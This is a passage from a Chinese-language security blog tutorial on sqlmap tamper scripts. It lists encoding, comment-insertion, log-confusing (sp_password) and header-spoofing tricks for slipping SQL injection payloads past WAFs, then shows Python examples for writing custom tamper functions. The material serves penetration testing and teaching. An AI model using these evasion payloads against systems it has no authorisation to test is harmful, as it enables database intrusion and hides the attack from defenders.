</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT//id//FROM//users
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2dash.py
</span></span><span class="line"><span class="cl">功能：用 [注释符 (–)+ 一个随机字符串 + 一个换行符] 替换控制符
</span></span><span class="line"><span class="cl">平台：MSSQL、 SQLite
</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2hash.py
</span></span><span class="line"><span class="cl">功能：用 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
</span></span><span class="line"><span class="cl">平台：Mysql
</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2morehash.py
</span></span><span class="line"><span class="cl">功能：用多个 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
</span></span><span class="line"><span class="cl">平台：MySQL &gt;= 5.1.13
</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2mssqlblank.py
</span></span><span class="line"><span class="cl">功能：用随机的空白符替换 payload 中的空格
</span></span><span class="line"><span class="cl">blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)
</span></span><span class="line"><span class="cl">平台：Mssql 2000,2005
</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2mssqlhash.py
</span></span><span class="line"><span class="cl">功能：用 [字符# + 一个换行符] 替换 payload 中的空格
</span></span><span class="line"><span class="cl">平台：MSSQL、MySQL
</span></span><span class="line"><span class="cl">举例：union select 1,2–+ ==&gt; union%23%0Aselect%23%0A1,2–+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2plus.py
</span></span><span class="line"><span class="cl">功能：用加号 (+) 替换空格
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT+id+FROM+users
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">space2randomblank.py
</span></span><span class="line"><span class="cl">功能：用随机的空白符替换 payload 中的空格
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sp_password.py
</span></span><span class="line"><span class="cl">功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space ==&gt; sp_password）
</span></span><span class="line"><span class="cl">平台：Mssql
</span></span><span class="line"><span class="cl">举例：1 AND 9227=9227–  ==&gt; 1 AND 9227=9227 – sp_password
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">symboliclogical.py
</span></span><span class="line"><span class="cl">功能：用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：
</span></span><span class="line"><span class="cl">1 and 1=1 ==&gt; 1 %26%26 1=1
</span></span><span class="line"><span class="cl">1 or 1=1 ==&gt; 1 %7c%7c 1=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">unionalltounion.py
</span></span><span class="line"><span class="cl">功能：用 union select 替换 union all select
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：union all select 1,2–+ ==&gt; union select 1,2–+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">unmagicquotes.py
</span></span><span class="line"><span class="cl">功能：用宽字符绕过 GPC addslashes
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：1’ and 1=1 ==&gt; 1% df%27 and 1=1–
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">uppercase.py
</span></span><span class="line"><span class="cl">功能：将 payload 中的小写字母转为大写格式
</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
</span></span><span class="line"><span class="cl">举例：insert ==&gt; INSERT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">varnish.py
</span></span><span class="line"><span class="cl">功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF
</span></span><span class="line"><span class="cl">平台：headers = kwargs.get (“headers”, {}) headers [“X-originating-IP”] = “127.0.0.1”return payload
</span></span><span class="line"><span class="cl">举例：All
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">versionedkeywords.py
</span></span><span class="line"><span class="cl">功能：对非函数的关键字进行注释
</span></span><span class="line"><span class="cl">平台：MySQL 4.0.18, 5.1.56, 5.5.11
</span></span><span class="line"><span class="cl">举例：1 union select user () ==&gt; 1/!UNION//!SELECT/user ()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">versionedmorekeywords.py
</span></span><span class="line"><span class="cl">功能：对每个关键字进行注释处理
</span></span><span class="line"><span class="cl">平台：MySQL 5.1.56, 5.5.11
</span></span><span class="line"><span class="cl">举例：1 union select user () ==&gt; 1/!UNION//!SELECT/user ()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">xforwardedfor.py
</span></span><span class="line"><span class="cl">功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF
</span></span><span class="line"><span class="cl">平台：All
</span></span><span class="line"><span class="cl">举例：headers = kwargs.get (“headers”, {}) headers [“X-Forwarded-For”] = randomIP () return payload
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="编写tamper">编写tamper</h4>
<p>先来看一个简单的 tamper：apostrophemask.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Needed imports</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Define which is the order of application of tamper scripts against</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the payload</span>
</span></span><span class="line"><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    Description of your tamper script
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%E</span><span class="s2">F%BC%87&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">payload</span> <span class="k">else</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># your code to tamper the original payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># return the tampered payload</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个 tamper 非常的简单，写的话参考这个就可以了，先来分析这里边有什么元素</p>
<ul>
<li>
<p>import部分</p>
</li>
<li>
<p>_<em>priority</em>_ 属性</p>
</li>
<li>
<p>dependencies函数</p>
</li>
<li>
<p>tamper函数以及用户自定义的函数</p>
</li>
</ul>
<p>import部分</p>
<p>可以导入sqlmap的内部库，sqlmap 为我们提供了很多封装好的函数和数据类型，比如上面的的PRIORITY就来源于</p>
<p><code>sqlmap/lib/core/enums.py</code></p>
<p>priority</p>
<p>定义当前 tamper 的优先级，用于有多个tamper脚本的情况，有以下参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PRIORITY</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">LOWEST</span> <span class="o">=</span> <span class="o">-</span><span class="mi">100</span>
</span></span><span class="line"><span class="cl">    <span class="n">LOWER</span> <span class="o">=</span> <span class="o">-</span><span class="mi">50</span>
</span></span><span class="line"><span class="cl">    <span class="n">LOW</span> <span class="o">=</span> <span class="o">-</span><span class="mi">10</span>
</span></span><span class="line"><span class="cl">    <span class="n">NORMAL</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">HIGH</span> <span class="o">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">    <span class="n">HIGHER</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">    <span class="n">HIGHEST</span> <span class="o">=</span> <span class="mi">100</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>dependencies</p>
<p>函数声明该脚本适用/不适用的范围，可以为空，比如以下代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sqlmap/tamper/echarunicodeencode.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.common</span> <span class="kn">import</span> <span class="n">singleTimeWarnMessage</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">singleTimeWarnMessage</span><span class="p">(</span><span class="s2">&#34;tamper script &#39;</span><span class="si">%s</span><span class="s2">&#39; is only meant to be run against ASP or ASP.NET web applications&#34;</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1"># singleTimeWarnMessage() 于在控制台中打印出警告信息</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>数据库有以下名称，在<code>lib\core\enums.py</code>可以看到全部</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DBMS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">ACCESS</span> <span class="o">=</span> <span class="s2">&#34;Microsoft Access&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DB2</span> <span class="o">=</span> <span class="s2">&#34;IBM DB2&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FIREBIRD</span> <span class="o">=</span> <span class="s2">&#34;Firebird&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">MAXDB</span> <span class="o">=</span> <span class="s2">&#34;SAP MaxDB&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">MSSQL</span> <span class="o">=</span> <span class="s2">&#34;Microsoft SQL Server&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">MYSQL</span> <span class="o">=</span> <span class="s2">&#34;MySQL&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ORACLE</span> <span class="o">=</span> <span class="s2">&#34;Oracle&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PGSQL</span> <span class="o">=</span> <span class="s2">&#34;PostgreSQL&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SQLITE</span> <span class="o">=</span> <span class="s2">&#34;SQLite&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SYBASE</span> <span class="o">=</span> <span class="s2">&#34;Sybase&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">HSQLDB</span> <span class="o">=</span> <span class="s2">&#34;HSQLDB&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">......</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>tamper函数</p>
<p>主要功能实现的函数，其中 payload 参数就是原始的 sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个 payload 的修改</p>
<p>比如双写绕过的 payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;select&#39;</span><span class="p">,</span><span class="s1">&#39;seleselectct&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;union&#39;</span><span class="p">,</span><span class="s1">&#39;ununionion&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>第二个参数：<code>**kwargs</code>中包含了 http 头的数据，可以从<code>kwargs</code>中取出<code>headers</code>数组在进行更改</p>
<p>比如将 http 头中的 xff 头变为随机 ip</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">headers</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;headers&#34;</span><span class="p">,</span> <span class="p">{})</span>
</span></span><span class="line"><span class="cl">	<span class="n">headers</span><span class="p">[</span><span class="s2">&#34;X-Forwarded-For&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">randomIP</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">payload</span>
</span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2025-05-27</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kali/">kali</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/hydra-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE/" class="prev" rel="prev" title="hydra-暴力破解工具-支持多种协议"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>hydra-暴力破解工具-支持多种协议</a>
            <a href="/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="next" rel="next" title="CSRF-跨站请求伪造">CSRF-跨站请求伪造<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="valine" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><script src="https://cdn1.lncld.net/static/js/av-mini-0.6.10.js"></script><script src="http://jerry-cdn.b0.upaiyun.com/hit-kounter/hit-kounter-lc-0.2.0.js"></script><span data-hk-page="current"> - </span></div><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/hubu8" target="_blank">Eccentric</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"rTeTnudkYwu3cz5ejsdiKdFm-gzGzoHsz","appKey":"SfE7A8tmPKu2F6Pf5LMUewa4","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","meta":["nick","mail"],"pageSize":10,"placeholder":"在这里留下足迹吧!","recordIP":true,"visitor":true}},"search":{"algoliaAppID":"CT9HNMDY0J","algoliaIndex":"hugo","algoliaSearchKey":"e48b980a6aaab08129f8a8d9a425c47b","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
